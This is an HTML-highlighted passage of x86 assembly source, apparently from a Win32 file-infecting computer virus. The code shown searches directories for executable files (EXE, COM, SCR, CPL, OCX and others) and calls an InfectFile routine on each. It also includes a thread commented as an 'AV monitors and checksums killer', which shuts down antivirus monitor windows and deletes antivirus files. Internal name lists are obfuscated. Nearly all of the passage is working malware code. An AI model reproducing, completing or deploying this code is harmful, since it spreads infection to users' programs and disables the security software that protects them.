       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compare_result</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_extension</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_extension</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_cFileName</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;point name...</span><span class="sc0">
</span><span class="sc5">@002</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;syncronize!!!</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@002</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NOT_AVAILABLE</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">                             </span><span class="sc1">;infect it!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AVAILABLE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">find_next_file</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">done_directory</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">find_next_file</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindNextFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;find next</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">compare_result</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_extension</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_first_file</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_directory</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_extensions</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;recrypt the extenstions</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_extensions_len</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Infect_Directory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">file_extensions</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;the list with valid</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">L</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.EXE</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;extensions</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.COM</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.ACM</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.CPL</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.HDI</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.OCX</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.PCI</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.QTC</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.SCR</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.X32</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.CNV</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.FMT</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.OCM</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.OLB</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GOAT</span><span class="sc4">*</span><span class="sc5">.WPC</span><span class="sc4">&gt;</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;extensions</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">L</span><span class="sc4">&gt;</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.EXE</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;normal exe</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.COM</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;same</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.ACM</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.CPL</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;control panel object</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.HDI</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;heidi file</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.OCX</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;windowz ocx</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.PCI</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.QTC</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.SCR</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;screen saver</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.X32</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.CNV</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.FMT</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.OCM</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.OLB</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">.WPC</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">file_extensions_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_extensions</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread_2_StartAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;€ This Thread is the AV monitors and checksums killer thread</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">Thread_3_StartAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">tdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@Thread3Delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@Thread3Delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Thread3Delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD3SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thread3Exception</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">ANTIAV</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">av_monitors</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;First kill some monitors</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">monitors_nr</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LocateMonitors</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindWindowA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">get_next_monitor</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_PostMessageA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WM_ENDSESSION</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_next_monitor</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LocateMonitors</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;point av files list</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_list_len</span><span class="sc0">                        </span><span class="sc1">;and</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;restore names...</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;point to Search Record</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">locate_next_av</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">;is this the end?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_kill_done</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                    </span><span class="sc1">;push search rec. address</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;push filename address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;find first match</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">next_av_file</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_cFileName</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;ESI = ptr to filename</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;push filename address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DeleteFileA</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;delete file!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;close the find handle</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_av_file</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_next_av</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_kill_done</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;point av files list</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_list_len</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;hide names...</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">THREAD3SEH</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_thread3_seh</span><span class="sc0">                     </span><span class="sc1">;host</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Thread3Exception</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;if we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecover3</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRecover3</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecover3</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_thread3_seh</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
